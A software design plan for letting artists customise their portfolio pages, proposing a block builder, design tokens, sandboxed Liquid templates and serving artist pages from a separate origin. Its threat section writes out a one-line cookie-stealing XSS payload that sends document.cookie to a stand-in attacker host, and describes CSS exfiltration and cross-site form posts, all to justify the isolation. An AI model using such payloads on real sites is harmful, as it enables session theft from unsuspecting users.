# Plan: the web builder

Status: **proposed, not started.** Nothing here is built. The public page today is
one fixed template (`app/views/projects/show.html.erb`).

## What we're solving

Artists should be able to shape their own page rather than accept one layout. The
brief allowed two routes — "similar to what Wix does, **or** by allowing custom
HTML/CSS and offer functions to render their content."

This plan proposes doing both, in that order, because they answer different
needs and the second one carries a security cost the first does not.

| Route | Who it's for | Ceiling |
| --- | --- | --- |
| Block builder | Everyone. The default. | Rearrange, restyle, choose what shows |
| Custom template | The minority who write code | Anything |

## The constraint that shapes everything: origin

**This is the decision to make first, because it also decides the custom-domains
plan, and it is expensive to retrofit.**

Artist pages are served from the same origin as the dashboard
(`artcomm.com/:username`). The session cookie lives on that origin. So the moment
an artist can put JavaScript — or even clever CSS — on their own page, they can
attack any signed-in artist who visits it:

- `<script>fetch('https://evil.tld?c='+document.cookie)</script>` — session theft
- CSS attribute selectors that leak DOM contents via background-image requests
- A form posting to `/account` using the visitor's ambient session

HTML sanitising alone is not a sufficient answer. Sanitisers get bypassed, and
CSS exfiltration slips past them by design. Note the current state makes this
worse: `config/initializers/content_security_policy.rb` is **entirely commented
out**, so there is no CSP at all right now.

### Recommendation

**Serve all artist-authored pages from a separate origin, and never set the
session cookie there.**

```
artcomm.com          dashboard, signup, login   (session cookie lives here)
*.artcomm.site       artist pages               (no session cookie, ever)
artist-owned domains artist pages               (no session cookie, ever)
```

Two properties fall out of this:

1. Injected script on an artist page has no session to steal. The blast radius
   collapses to that one page.
2. Custom domains (plan #12) already require serving artist pages on arbitrary
   hosts. That work and this isolation are **the same work** — doing them
   together is much cheaper than doing them in sequence.

The cost is real: "preview as owner" and any signed-in affordance on a public
page needs a signed, short-lived token in the URL rather than a cookie. That is
a contained problem and worth it.

### Alternatives considered

- **Sanitise and keep one origin.** Cheapest, and genuinely inadequate for raw
  HTML/CSS. Acceptable *only* for the block builder, where no user-authored
  markup reaches the page.
- **Render user content in a sandboxed `<iframe>`.** Real isolation, but it
  fights responsive layout, SEO, and deep links. Wrong shape for a page that
  *is* the whole site.
- **CSP alone on one origin.** Strong, but one `unsafe-inline` for a legitimate
  styling feature reopens the hole. Defence in depth, not the primary boundary.

## Recommended architecture

A **renderer seam**: the public controller asks for a design and renders blocks,
never string-interpolating artist input into markup.

```
Project#design  ->  Design::Renderer  ->  block partials (trusted ERB)
                                      ->  Liquid template (advanced route)
```

The current fixed template becomes the **default theme** — a preset arrangement
of the same blocks. A project with no design renders it, so nothing changes for
existing pages and there is no migration.

### Data model

Add to `projects`:

```ruby
t.jsonb :draft_design,     null: false, default: {}
t.jsonb :published_design, null: false, default: {}
```

Two columns rather than a versions table:

- Publishing is a single atomic column copy.
- Reverting is trivial.
- We never need to query *inside* a design, so rows buy nothing.

If per-version history is wanted later, add a `project_design_versions` table
alongside; nothing here blocks that.

A design is an ordered list of blocks:

```json
{
  "version": 1,
  "blocks": [
    { "type": "header",  "settings": { "show_bio": true } },
    { "type": "gallery", "settings": { "columns": 3, "show_prices": true } },
    { "type": "text",    "settings": { "body": "Studio visits by appointment." } }
  ]
}
```

**Block settings are validated against a schema per block type on write.** Each
type declares its permitted keys and value types; anything else is rejected. This
is what keeps the jsonb column from becoming an injection vector.

### Block types for v1

Everything the current template already does, decomposed:

`header` · `gallery` (the art-piece grid) · `text` · `image` · `contact`
(the WhatsApp button) · `spacer`

Each is a trusted ERB partial. Artist input only ever lands in **settings**, never
in markup.

### Theming without code

Before custom CSS, most of the demand is colour, type, and spacing. Expose those
as a constrained token set rendered into CSS custom properties:

```erb
<style>:root { --ink: <%= design.token(:ink) %>; ... }</style>
```

Tokens are validated (a colour must parse as a colour), so this is safe on any
origin — no separate-origin prerequisite. **This likely satisfies most artists**
and should ship before the custom-template route.

### The custom template route

For artists who want to write code, use **Liquid** rather than ERB or raw HTML.
Liquid is built for exactly this — it cannot call arbitrary Ruby, and it is what
Shopify exposes to untrusted theme authors.

This is also the concrete answer to "offer functions to render their content":
expose a small set of drops with whitelisted attributes.

```liquid
<h1>{{ artist.name }}</h1>
{% for piece in project.pieces %}
  <figure>
    {{ piece.image | variant: 'display' }}
    <figcaption>{{ piece.title }} — {{ piece.price }}</figcaption>
  </figure>
{% endfor %}
{% if artist.whatsapp %}{{ artist.whatsapp_button }}{% endif %}
```

Rules: a render timeout, a node/loop budget, no filesystem or network filters,
and drops expose only what is listed. Custom CSS ships with it. **Both are gated
behind the separate origin.**

## Phasing

Each phase is independently shippable and each leaves the product working.

| Phase | Work | Depends on |
| --- | --- | --- |
| **A** | Extract the current template into blocks behind a renderer. No user-visible change. | — |
| **B** | Block builder UI: reorder, toggle, edit settings. Draft/publish. | A |
| **C** | Design tokens (colour, type, spacing). | B |
| **D** | Separate origin + CSP + cookie scoping. **Do jointly with custom domains.** | — |
| **E** | Liquid custom templates + custom CSS. | C, D |

Phase A is the valuable one to do early even if the builder is deferred: it is
pure refactoring, it is safe, and it means the fixed template is no longer a dead
end.

## Open questions

1. **Per project or per artist?** An artist with three galleries probably wants
   one consistent look, not three. Leaning: design lives on the **artist**, with
   an optional per-project override. This changes the migration above and is
   worth settling before Phase B.
2. **Does `*.artcomm.site` need to be a real registered domain?** Yes, and it
   should be on the [Public Suffix List](https://publicsuffix.org) so browsers
   treat subdomains as separate sites. Worth starting early — PSL additions are
   slow.
3. **Preview.** Signed short-lived URL, or render drafts on the dashboard origin
   where the cookie already works? The latter is simpler and probably right.
4. **Is Liquid worth it at all?** If design tokens (Phase C) satisfy nearly
   everyone, Phase E may never be justified. Decide after C, with real usage.

## What this plan deliberately does not do

- No drag-and-drop. Reorder buttons first, matching the current no-JavaScript
  approach; drag-and-drop is a later polish, not an architectural choice.
- No arbitrary JavaScript from artists, ever, on any origin. The separate origin
  contains the damage but does not make it a good idea.
- No page-level A/B testing, analytics, or multi-page sites. Out of scope.
